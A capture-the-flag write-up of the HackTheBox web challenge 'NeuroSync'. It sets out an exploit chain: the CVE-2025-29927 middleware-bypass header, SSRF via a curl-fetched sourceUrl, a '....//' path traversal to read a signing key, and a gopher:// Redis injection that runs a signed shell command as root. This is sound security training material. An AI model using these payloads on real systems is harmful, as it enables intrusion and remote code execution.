# NeuroSync — SOLVED (self-solved)

- Platform: HackTheBox (web). Next.js 15.1.9 interface + Express data-api + a Go
  device worker + Redis, all as root under supervisord on debian:12.
- Date: 2026-09-23
- Target: `http://154.57.164.82:32518`
- Flag: redacted; read from a live response
- Source was supplied.

## Shape

Four services, one exposed port. Every credential is randomised at boot
(`data/users.js` rewrites every username and password with
`Date.now()` + `Math.random()`, `JWT_SECRET` is 64 random hex), so logging in
and forging a token are both out. The whole challenge is reaching the API
without one.

## 1. The only auth gate is Next middleware, and it can be skipped

`interface/middleware.js` is the sole guard — `matcher: ["/api/:path*"]`, verify
a `jose` HS256 token, exempt `/api/auth/*`. No route re-checks anything.

`package.json` pins `"next": "15.1.9"`, which is below the **15.2.3** fix for
**CVE-2025-29927**: a request carrying `x-middleware-subrequest` makes Next treat
the request as an internal subrequest and skip middleware entirely. For the 15.x
line the value has to repeat the middleware name to the recursion limit:

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

```
GET /api/bci/analytics                → 401 {"error":"Unauthorized"}
GET /api/bci/analytics  + the header  → 200 {"timestamp":...,"metrics":{...}}
```

## 2. A stored URL that is validated on the wrong side

`app/api/bci/analytics/route.js` keeps `sourceUrl` in **module scope**:

```js
export async function PUT(req) { sourceUrl = body.sourceUrl }          // no validation
export async function GET(req) {
  if (!isLocalhostUrl(sourceUrl)) ...                                   // hostname only
  const { stdout } = await execFilePromise("curl", ["-s", sourceUrl]);
}
```

`isLocalhostUrl` only checks `new URL(...).hostname`. `execFile` takes an argv
array, so there is **no command injection** — but nothing checks the **scheme**,
so curl will speak any protocol it supports, to loopback, with the full URL under
our control. Writing and validating in different handlers is the actual bug.

## 3. Arbitrary file read out of an error handler

`data-api/index.js`:

```js
let logFile = req.query.logFile || "/var/log/logfile.txt";
logFile = logFile.replaceAll("../", "");          // single pass
if (!logFile.startsWith("/var/log/")) return 500; // checked AFTER the strip
...
catch (error) {
  res.status(500).json({ error: `Failed to read log file ${logFile}:\n${
     Buffer.from(fs.readFileSync(logFile,'utf8')).toString('base64')}` });
}
```

Two mistakes compound. `replaceAll` runs once, so `....//` collapses **into**
`../`, and the prefix check runs on the already-stripped string, so the traversal
is invisible to it. Then the catch block reads the file *again* and base64s it
into the error — a file that fails `JSON.parse` is therefore returned in full.

```
PUT sourceUrl = http://localhost:4000/logs?logFile=/var/log/....//....//tmp/secret.key
GET → {"error":"Failed to read log file /var/log/../../tmp/secret.key:\nY2NhOGVh..."}
```

That is `/tmp/secret.key`, the 32-hex HMAC key `entrypoint.sh` writes at boot.

## 4. Signing the command the Go worker will run as root

`bci-device/device.go` blocks on `BLPOP bci_commands` and, for `OS_EXEC`, checks
`HMAC-SHA256(secret, "OS_EXEC|<base64 payload>")` before

```go
exec.Command("sh", "-c", cmd.Payload).CombinedOutput()
```

With the key in hand the signature is ours to make. The list entry goes in over
**gopher**, which `new URL()` reports as hostname `localhost` and which curl
speaks as raw bytes:

```
gopher://localhost:6379/_<url-encoded RESP: RPUSH bci_commands OS_EXEC|b64|sig>
```

The worker's output goes to `/dev/null` (supervisord), so the payload writes
where the read primitive can reach instead:

```sh
cat /flag*.txt > /var/log/zzns.txt; chmod 644 /var/log/zzns.txt
```

`entrypoint.sh` renames the flag to `/flag<10 hex>.txt`, so it has to be globbed
— which is exactly why the chain needs command execution and not just the read.
Reading that path back through `/logs` returned the flag base64-encoded.

## Traps that cost time

- **The gopher request never returns.** Redis does not close the connection, so
  curl waits, `execFile` has no timeout, and the HTTP request times out client
  side. The RPUSH has already landed — treat the timeout as success and verify
  with the read primitive, or append `QUIT` to the RESP so Redis hangs up.
- **RESP length prefixes are byte counts.** The matching chain card lists this as
  its first trap and it still applies verbatim.
- **Read error bodies.** Both the file read and the flag arrive inside HTTP 500
  JSON, never in a 200.
- `execFile` with an argv array is genuinely injection-proof; the exploitable
  surface is the *scheme*, not the argument. Do not waste probes on `;` and `$()`.

## Cleanup performed

A second signed `OS_EXEC` removed `/var/log/zzns.txt`, and `sourceUrl` was PUT
back to `http://localhost:4000/analytics`. The endpoint now returns normal
analytics and the copied flag is gone.

## Reusable lessons

- **Pin-check the framework before probing logic.** One `grep '"next"'` in
  `package.json` decided this challenge; 15.1.9 against a 15.2.3 fix is the whole
  auth bypass.
- **When a value is stored by one handler and validated by another, attack the
  gap** — here the validator only ever saw the hostname.
- **A `../` strip that runs once is not a strip.** `....//` survives it, and a
  prefix check placed after the strip validates the wrong string.
- **An error handler that re-reads the file is a read primitive.** Look for the
  second `readFileSync` inside `catch`.
- **`execFile` closes command injection but not protocol choice.** curl reached
  Redis over gopher from a URL whose only validated property was its hostname.
